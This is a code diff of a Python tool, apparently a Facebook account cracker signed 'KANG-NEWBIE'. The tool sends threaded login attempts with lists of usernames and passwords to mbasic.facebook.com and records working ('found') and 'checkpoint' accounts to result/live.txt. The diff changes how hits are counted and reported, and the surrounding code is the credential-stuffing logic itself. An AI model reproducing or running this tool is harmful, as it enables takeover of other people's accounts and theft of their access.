@@ -15,7 +15,8 @@ print("""%s
 /___/_/_/_/_/ .__/_/\__/_/  /_/____/_/ %sv.2%s
            /_/ 		%sAuthor:KANG-NEWBIE%s
 """%(c,y,c,g,w))
-lie=[]
+cek=[]
+tap=[]
 def main(arg):
 	try:
                 url='https://mbasic.facebook.com/login.php'
@@ -29,7 +30,7 @@ def main(arg):
                 if 'save-device' in str(respData) or 'm_sess' in str(respData):
                         true='yeah'
                         live="[found] %s => %s"%(arg,pas)
-                        lie.append(true)
+                        tap.append(true)
                         try:
                                 os.mkdir('result')
                         except FileExistsError:
@@ -39,7 +40,7 @@ def main(arg):
                         print("%s[%sfound%s]%s %s -> %s"%(c,g,c,w,arg,pas))
                 elif 'checkpoint' in str(respData):
                         true='notbad'
-                        lie.append(true)
+                        cek.append(true)
                         CP="[checkpoint] %s => %s"%(arg,pas)
                         try:
                                 os.mkdir('result')
@@ -70,5 +71,6 @@ for x in file:
 p=ThreadPool(5)
 p.map(main,o)
 
-if 'yeah' in str(lie) or 'notbad' in str(lie):
-        print("\nLive Results saved: result/live.txt")
+if 'yeah' in str(tap) or 'notbad' in str(cek):
+        print("\nFound ["+str(len(tap))+"] CheckPoint ["+str(len(cek))+"]")
+        print("Live Results saved: result/live.txt")
